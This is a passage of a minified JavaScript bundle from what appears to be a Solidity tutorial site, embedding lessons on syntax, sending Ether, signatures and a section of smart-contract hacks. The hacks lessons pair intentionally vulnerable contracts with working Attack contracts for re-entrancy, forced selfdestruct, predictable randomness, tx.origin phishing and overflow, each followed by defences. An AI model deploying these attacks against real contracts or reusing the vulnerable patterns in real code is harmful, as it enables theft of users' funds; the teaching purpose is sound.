with the following format:\n        "\\x19Ethereum Signed Message\\n" + len(msg) + msg\n        */\n        return keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", _messageHash));\n    }\n\n    /* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = "coffee and donuts"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function verify(\n        address _signer,\n        address _to, uint _amount, string memory _message, uint _nonce,\n        bytes memory signature\n    )\n        public pure returns (bool)\n    {\n        bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce);\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        return recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature)\n        public pure returns (address)\n    {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n\n        return ecrecover(_ethSignedMessageHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig)\n        public pure returns (bytes32 r, bytes32 s, uint8 v)\n    {\n        require(sig.length == 65, "invalid signature length");\n\n        assembly {\n            /*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */\n\n            // first 32 bytes, after the length prefix\n            r := mload(add(sig, 32))\n            // second 32 bytes\n            s := mload(add(sig, 64))\n            // final byte (first byte of the next 32 bytes)\n            v := byte(0, mload(add(sig, 96)))\n        }\n\n        // implicitly return (r, s, v)\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/shadowing-inherited-state-variables",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Shadowing Inherited State Variables",description:"An example of shadowing state variables by inheritance",html:'<p>Unlike functions, state variables cannot be overridden by re-declaring it\nin the child contract.</p>\n<p>Let&#39;s learn how to correctly override inherited state variables.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract A {\n    string public name = "Contract A";\n\n    function getName() public view returns (string memory) {\n        return name;\n    }\n}\n\ncontract B is A {\n    // This is the incorrect way to override inherited state variables.\n    string public name = "Contract B";\n\n    // B.getName returns "Contract A"\n\n    // Functions defined in contract A that use the &#39;name&#39; state variable\n    // will access A.name. Functions defined in B that uses &#39;name&#39; will\n    // access B.name.\n}\n\ncontract C is A {\n    // This is the correct way to override inherited state variables.\n    constructor() public {\n        name = "Contract C";\n    }\n\n    // C.getName returns "Contract C"\n}\n</code></pre>\n'})}},{path:"/0.5/sending-ether",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Sending Ether (transfer, send, call)",description:"An example of sending Ether in Solidity",html:'<h3 id="how-to-send-ether">How to send Ether?</h3>\n<p>You can send Ether to other contracts by</p>\n<ul>\n<li><code>transfer</code> (2300 gas, throws error)</li>\n<li><code>send</code> (2300 gas, returns bool)</li>\n<li><code>call</code> (forward all gas or set gas, returns bool)</li>\n</ul>\n<h3 id="which-method-should-you-use">Which method should you use?</h3>\n<p><code>call</code> in combination with re-entrancy guard is the recommended method to use after December 2019.</p>\n<p>Guard against re-entrancy by</p>\n<ul>\n<li>making all state changes before calling other contracts</li>\n<li>using re-entrancy guard modifier</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract ReceiveEther {\n    // This is a special function called the fallback.\n    // The fallback function declared payable enables other contracts to\n    // send Ether by send, transfer, or call.\n    function () external payable {}\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract SendEther {\n    function sendViaTransfer(address payable _to) public payable {\n        // This function is no longer recommended for sending Ether.\n        _to.transfer(msg.value);\n    }\n\n    function sendViaSend(address payable _to) public payable {\n        // Send returns a boolean value indicating success or failure.\n        // This function is not recommended for sending Ether.\n        bool sent = _to.send(msg.value);\n        require(sent, "Failed to send Ether");\n    }\n\n    function sendViaCall(address payable _to) public payable {\n        // Call returns a boolean value indicating success or failure.\n        // This is the current recommended method to use.\n        (bool sent, bytes memory data) = _to.call.value(msg.value)("");\n        require(sent, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/primitives",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Primitive Data Types",description:"Primitive data types",html:'<p>Here we introduce you to some primitive data types available in Solidity.</p>\n<ul>\n<li><code>boolean</code></li>\n<li><code>uint</code></li>\n<li><code>int</code></li>\n<li><code>address</code></li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Primitives {\n    bool boo = true;\n\n    /*\n    uint stands for unsigned integer, meaning non negative integers\n    different sizes are available\n        uint8   ranges from 0 to 2 ** 8 - 1\n        uint16  ranges from 0 to 2 ** 16 - 1\n        ...\n        uint256 ranges from 0 to 2 ** 256 - 1\n    */\n    uint8 u8 = 1;\n    uint256 u256 = 456;\n    uint u = 123; // uint is an alias for uint256\n\n    /*\n    Negative numbers are allowed for int types.\n    Like uint, different ranges are available from uint8 to uint256\n    */\n    int8 i8 = -1;\n    int256 i256 = 456;\n    int i = -123; // int is same as int256\n\n    address addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;\n\n    // Default values\n    // Unassigned variables have a default value\n    bool defaultBoo; // false\n    uint defaultUint; // 0\n    int defaultInt; // 0\n    address defaultAddr; // 0x0000000000000000000000000000000000000000\n}\n</code></pre>\n'})}},{path:"/0.5/payable",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Payable",description:"An example of how to use the keyword payable in Solidity",html:'<p>Functions and addresses declared <code>payable</code> can receive <code>ether</code> into the contract.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Payable {\n    // Payable address can receive Ether\n    address payable public owner;\n\n    // Payable constructor can receive Ether\n    constructor() public payable {\n        owner = msg.sender;\n    }\n\n    // Function to deposit Ether into this contract.\n    // Call this function along with some Ether.\n    // The balance of this contract will be automatically updated.\n    function deposit() public payable {\n    }\n\n    // Call this function along with some Ether.\n    // The function will throw an error since this function is not payable.\n    function notPayable() public {\n    }\n\n    // Function to withdraw all Ether from this contract.\n    function withdraw() public {\n        // get the amount of Ether stored in this contract\n        uint amount = address(this).balance;\n\n        // send all Ether to owner\n        // Owner can receive Ether since the address of owner is payable\n        (bool success,) = owner.call.value(amount)("");\n        require(success, "Failed to send Ether");\n    }\n\n    // Function to transfer Ether from this contract to address from input\n    function transfer(address payable _to, uint _amount) public {\n        // Note that "to" is declared as payable\n        (bool success,) = _to.call.value(_amount)("");\n        require(success, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/new-contract",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Contract that Create other Contracts",description:"Learn how to create new contract from inside a contract with Solidity",html:'<p>Contracts can be created by other contracts using the <code>new</code> keyword.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Car {\n    address public owner;\n    string public model;\n\n    constructor(address _owner, string memory _model) public payable {\n        owner = _owner;\n        model = _model;\n    }\n}\n\ncontract CarFactory {\n    Car[] public cars;\n\n    function create(address _owner, string memory _model) public {\n        Car car = new Car(_owner, _model);\n        cars.push(car);\n    }\n\n    function createAndSendEther(address _owner, string memory _model)\n        public\n        payable\n    {\n        Car car = (new Car).value(msg.value)(_owner, _model);\n        cars.push(car);\n    }\n\n    function getCar(uint _index)\n        public\n        view\n        returns (address owner, string memory model, uint balance)\n    {\n        Car car = cars[_index];\n\n        return (car.owner(), car.model(), address(car).balance);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/mapping",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Mapping",description:"Example of using mapping in Solidity",html:'<p>Maps are created with the syntax <code>mapping(keyType =&gt; valueType)</code>.</p>\n<p><code>keyType</code> can be value types such as <code>uint</code>, <code>address</code> or <code>bytes</code>.</p>\n<p><code>valueType</code> can be any type including another mapping or an array.</p>\n<p>Mappings are not iterable.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Mapping {\n    // Mapping from address to uint\n    mapping(address =&gt; uint) public myMap;\n\n    function get(address _addr) public view returns (uint) {\n         // Mapping always returns a value.\n         // If the value was never set, it will return the default value.\n        return myMap[_addr];\n    }\n\n    function set(address _addr, uint _i) public {\n        // Update the value at this address\n        myMap[_addr] = _i;\n    }\n\n    function remove(address _addr) public {\n        // Reset the value to the default value.\n        delete myMap[_addr];\n    }\n}\n\ncontract NestedMapping {\n    // Nested mapping (mapping from address to another mapping)\n    mapping(address =&gt; mapping(uint =&gt; bool)) public nested;\n\n    function get(address _addr1, uint _i) public view returns (bool) {\n         // You can get values from a nested mapping\n         // even when it is not initialized\n        return  nested[_addr1][_i];\n    }\n\n    function set(address _addr1, uint _i, bool _boo) public {\n        nested[_addr1][_i] = _boo;\n    }\n\n    function remove(address _addr1, uint _i) public {\n        delete nested[_addr1][_i];\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/loop",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"For and While Loop",description:"Example of for and while loop in Solidity",html:'<p>Solidity supports <code>for</code>, <code>while</code>, and <code>do while</code> loops.</p>\n<p>Don&#39;t write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.</p>\n<p>For the reason above, <code>while</code> and <code>do while</code> loops are rarely used.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Loop {\n    function loop() public {\n        // for loop\n        for (uint i = 0; i &lt; 10; i++) {\n            if (i == 3) {\n                // Skip to next iteration with continue\n                continue;\n            }\n            if (i == 5) {\n                // Exit loop with break\n                break;\n            }\n        }\n\n        // while loop\n        uint i;\n        while (i &lt; 10) {\n            i++;\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/library",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Library",description:"Example of how to write and use libraries in your Solidity code",html:'<p>Libraries are similar to contracts, but you can&#39;t declare any state variable and\nyou can&#39;t send ether.</p>\n<p>A library is embedded into the contract if all library functions are internal.</p>\n<p>Otherwise the library must be deployed and then linked before the contract is deployed.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\nlibrary SafeMath {\n    function add(uint x, uint y) internal pure returns (uint) {\n        uint z = x + y;\n        require(z &gt;= x, "uint overflow");\n\n        return z;\n    }\n}\n\ncontract TestSafeMath {\n    using SafeMath for uint;\n\n    uint public MAX_UINT = 2 ** 256 - 1;\n\n    function testAdd(uint x, uint y) public pure returns (uint) {\n        return x.add(y);\n    }\n}\n\n// Array function to delete element at index and re-organize the array\n// so that their are no gaps between the elements.\nlibrary Array {\n    function remove(uint[] storage arr, uint index) public {\n        // Move the last element into the place to delete\n        arr[index] = arr[arr.length - 1];\n        arr.pop();\n    }\n}\n\ncontract TestArray {\n    using Array for uint[];\n\n    uint[] public arr;\n\n    function testArrayRemove() public {\n        for (uint i = 0; i &lt; 3; i++) {\n            arr.push(i);\n        }\n\n        arr.remove(1);\n\n        assert(arr.length == 2);\n        assert(arr[0] == 0);\n        assert(arr[1] == 2);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/interface",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Interface",description:"An example of interface in Solidity",html:'<p>Interface define contraints so that any contract that implements this can communicate with another contract that require these contraints.</p>\n<p>Interface</p>\n<ul>\n<li>cannot have any functions implemented</li>\n<li>cannot inherit from other contracts and interfaces</li>\n<li>all declared functions must be external</li>\n<li>cannot declare a constructor</li>\n<li>cannot declare state variables</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nHere is an example where the Zoo contract calls a contract the implements\nthe Animal interface.\n*/\ninterface Animal {\n    enum FoodType { MEAT, PLANT, ANY }\n\n    struct Position {\n        uint x;\n        uint y;\n    }\n\n    event Talk(string message);\n\n    // All functions must be external\n    function move(uint x, uint y) external;\n    function eat(FoodType foodType) external returns (bool);\n    function talk(string calldata message) external;\n}\n\ncontract Wolf is Animal {\n    Position position;\n\n    function talk(string calldata message) external {\n        emit Talk("Woof!");\n        emit Talk(message);\n    }\n\n    function move(uint x, uint y) external {\n        position.x = x;\n        position.y = y;\n    }\n\n    function eat(FoodType foodType) external returns (bool) {\n        return foodType == FoodType.MEAT;\n    }\n}\n\ncontract Zoo {\n    function feed(address _animal, Animal.FoodType foodType) public returns (bool) {\n        Animal animal = Animal(_animal);\n\n        animal.talk("I&#39;m hungry");\n\n        return animal.eat(foodType);\n    }\n}</code></pre>\n'})}},{path:"/0.5/inheritance",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Inheritance",description:"Example of inheritance in Solidity",html:'<p>Solidity supports multiple inheritance. Contracts can inherit other contract by using the <code>is</code> keyword.</p>\n<p>Order of inheritance is important.</p>\n<p>You have to list the parent contracts in the order from \u201cmost base-like\u201d to \u201cmost derived\u201d.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n\n/* Graph of inheritance\n    A\n   / \\\n  B   C\n / \\ /\nF  D,E\n\n*/\n\ncontract A {\n    function foo() public pure returns (string memory) {\n        return "A";\n    }\n}\n\n// Contracts inherit other contracts by using the keyword &#39;is&#39;.\ncontract B is A {\n    // Override A.foo()\n    function foo() public pure returns (string memory) {\n        return "B";\n    }\n}\n\ncontract C is A {\n    // Override A.foo()\n    function foo() public pure returns (string memory) {\n        return "C";\n    }\n}\n\n// Contracts can inherit from multiple parent contracts.\n// When a function is called that is defined multiple times in\n// different contracts, parent contracts are searched from\n// right to left, and in depth-first manner.\n\ncontract D is B, C {\n    // D.foo() returns "C"\n    // since C is the right most parent contract with function foo()\n}\n\ncontract E is C, B {\n    // E.foo() returns "B"\n    // since B is the right most parent contract with function foo()\n}\n\n// Inheritance must be ordered from \u201cmost base-like\u201d to \u201cmost derived\u201d.\n// Swapping the order of A and B will throw a compilation error.\ncontract F is A, B {\n}\n</code></pre>\n'})}},{path:"/0.5/import",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Import",description:"Learn how to import other Solidity files",html:'<p>You can import local and external files in Solidity.</p>\n<h3 id="local">Local</h3>\n<p>Here is our folder structure.</p>\n<pre><code>\u251c\u2500\u2500 Import.sol\n\u2514\u2500\u2500 Foo.sol</code></pre>\n<p>Foo.sol</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Foo {\n    string public name = "Foo";\n}\n</code></pre>\n<p>Import.sol</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// import Foo.sol from current directory\nimport "./Foo.sol";\n\ncontract Import {\n    // Initialize Foo.sol\n    Foo public foo = new Foo();\n\n    // Test Foo.sol by getting it&#39;s name.\n    function getFooName() public view returns (string memory) {\n        return foo.name();\n    }\n}\n</code></pre>\n<h3 id="external">External</h3>\n<p>You can also import from <a href="https://github.com">GitHub</a> by simply dropping the <code>https://</code> from the url</p>\n<pre><code class="language-solidity">// https://github.com/owner/repo/blob/branch/path/to/Contract.sol\nimport "github.com/owner/repo/blob/branch/path/to/Contract.sol";\n\n// Example import ECDSA.sol from openzeppelin-contract repo, release-v2.5.0 branch\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/cryptography/ECDSA.sol\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/cryptography/ECDSA.sol";</code></pre>\n'})}},{path:"/0.5/if-else",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"If / Else",description:"If / Else conditional statement in Solidity",html:'<p>Solidity support conditional statements <code>if</code>, <code>else if</code> and <code>else</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract IfElse {\n    function foo(uint x) public pure returns (uint) {\n        if (x &lt; 10) {\n            return 0;\n        } else if (x &lt; 20) {\n            return 1;\n        } else {\n            return 2;\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/hello-world",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Hello World",description:"Hello world in Solidity",html:'<p><code>pragma</code> specifies the compiler version of Solidity.</p>\n<pre><code class="language-solidity">// compiler version must be greater than or equal to 0.5.16 and less than 0.6.0\npragma solidity ^0.5.16;\n\ncontract HelloWorld {\n    string public greet = "Hello World!";\n}\n</code></pre>\n'})}},{path:"/0.5/hashing",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Hashing with Keccak256",description:"Example of hashing using Keccak256 in Solidity",html:'<p><code>keccak256</code> computes the Keccak-256 hash of the input.</p>\n<p>Some use cases are:</p>\n<ul>\n<li>Creating an deterministic unique ID from a input</li>\n<li>Commit-Reveal scheme</li>\n<li>Compact cryptographic signature (by signing the hash instead of a larger input)</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract HashFunction {\n    function hash(string memory _text, uint _num, address _addr)\n        public pure returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_text, _num, _addr));\n    }\n\n    // Example of hash collision\n    // Hash collision can occur when you pass more than one dynamic data type\n    // to abi.encodePacked. In such case, you should use abi.encode instead.\n    function collision(string memory _text, string memory _anotherText)\n        public pure returns (bytes32)\n    {\n        // encodePacked(AAA, BBB) -&gt; AAABBB\n        // encodePacked(AA, ABBB) -&gt; AAABBB\n        return keccak256(abi.encodePacked(_text, _anotherText));\n    }\n}\n\ncontract GuessTheMagicWord {\n    bytes32 public answer =\n        0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;\n\n    // Magic word is "Solidity"\n    function guess(string memory _word) public view returns (bool) {\n        return keccak256(abi.encodePacked(_word)) == answer;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/hacks/self-destruct",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Self Destruct",description:"An example of how to delete your smart contract by calling seldestruct in Solidity",html:'<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>\n<p><code>selfdestruct</code> sends all remainig Ether stored in the contract to an\ndesignated address.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>A malicious contract can use <code>selfdestruct</code> to\nforce send Ether to any contract.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// The goal of this game is to be the 7th player to deposit 1 Ether.\n// Players can deposit only 1 Ether at a time.\n// Winner will be able to withdraw all Ether.\n\n/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/\n\ncontract EtherGame {\n    uint public targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        uint balance = address(this).balance;\n        require(balance &lt;= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call.value(address(this).balance)("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) public {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance &gt;= 7 ether\n\n        // cast address to payable\n        address payable addr = address(uint160(address(etherGame)));\n        selfdestruct(addr);\n    }\n}\n\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Don&#39;t rely on <code>address(this).balance</code></p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract EtherGame {\n    uint public targetAmount = 3 ether;\n    uint public balance;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        balance += msg.value;\n        require(balance &lt;= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call.value(address(this).balance)("");\n        require(sent, "Failed to send Ether");\n    }\n}</code></pre>\n'})}},{path:"/0.5/hacks/re-entrancy",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Re-Entrancy",description:"An example of re-entrancy attack in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>\n<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// EtherStore is a contract vulnerable to re-entrancy attack. Let&#39;s see why.\n\n/*\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n5. Call Attack.collectEther to withdraw Ether from Attack\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/\n\ncontract EtherStore {\n    // Withdrawal limit = 1 ether / week\n    uint public withdrawalLimit = 1 ether;\n    mapping(address =&gt; uint) public lastWithdrawTime;\n    mapping(address =&gt; uint) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint _amount) public {\n        require(balances[msg.sender] &gt;= _amount);\n        require(_amount &lt;= withdrawalLimit);\n        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);\n\n        (bool sent, ) = msg.sender.call.value(_amount)("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] -= _amount;\n        lastWithdrawTime[msg.sender] = now;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) public {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    function () external payable {\n        if (address(etherStore).balance &gt;= 1 ether) {\n            etherStore.withdraw(1 ether);\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value &gt;= 1 ether);\n        etherStore.deposit.value(1 ether)();\n        etherStore.withdraw(1 ether);\n    }\n\n    function collectEther() public {\n        (bool sent, ) = msg.sender.call.value(address(this).balance)("");\n        require(sent, "Failed to send Ether");\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Ensure all state changes happen before calling external contracts</li>\n<li>Use function modifiers that prevent re-entrancy</li>\n</ul>\n<p>Here is a example of a re-entracy guard</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, "No re-entrancy");\n        locked = true;\n        _;\n        locked = false;\n    }\n}</code></pre>\n'})}},{path:"/0.5/hacks/randomness",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Source of Randomness",description:"Blockchain is not a reliable source of randomness in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nNOTE: cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/\n\n/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let&#39;s see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/\n\ncontract GuessTheRandomNumber {\n    constructor() public payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(keccak256(abi.encodePacked(\n            blockhash(block.number - 1),\n            block.timestamp\n        )));\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call.value(1 ether)("");\n            require(sent, "Failed to send Ether");\n        }\n    }\n}\n\ncontract Attack {\n    function () external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n         uint answer = uint(keccak256(abi.encodePacked(\n            blockhash(block.number - 1),\n            block.timestamp\n        )));\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li>\n</ul>\n'})}},{path:"/0.5/hacks/phishing-with-tx-origin",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Phishing with tx.origin",description:"An example of phishing with tx.origin in Solidity",html:'<h3 id="whats-the-difference-between-msgsender-and-txorigin">What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3>\n<p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>A malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let&#39;s see how we can hack this contract\n*/\n\n/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice&#39;s Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice&#39;s wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice&#39;s wallet to Eve&#39;s address.\nSince tx.origin in Wallet.transfer() is equal to Alice&#39;s address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() public payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(tx.origin == owner, "Not owner");\n\n        (bool sent, ) = _to.call.value(_amount)("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) public {\n        wallet = Wallet(_wallet);\n        owner = msg.sender;\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>\n<pre><code class="language-solidity">    function transfer(address payable _to, uint _amount) public {\n        require(msg.sender == owner, "Not owner");\n\n        (bool sent, ) = _to.call.value(_amount)("");\n        require(sent, "Failed to send Ether");\n    }</code></pre>\n'})}},{path:"/0.5/hacks/overflow",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Arithmetic Overflow and Underflow",description:"An example of hacking Solidity with arithmetic overflow / underflow",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Integers in Solidity overflow / underflow without any errors.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for atleast a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address =&gt; uint) public balances;\n    mapping(address =&gt; uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = now + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] &gt; 0, "Insufficient funds");\n        require(now &gt; lockTime[msg.sender], "Lock time not expired");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call.value(amount)("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) public {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    function () external payable {}\n\n    function attack() public payable {\n        timeLock.deposit.value(msg.value)();\n        timeLock.increaseLockTime(\n            uint(-1) - timeLock.lockTime(address(this)) + 1\n        );\n        timeLock.withdraw();\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Use <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol" target="__blank">SafeMath</a> to will prevent arithmetic overflow and underflow</li>\n</ul>\n'})}},{path:"/0.5/hacks/honeypot",component:function(){return 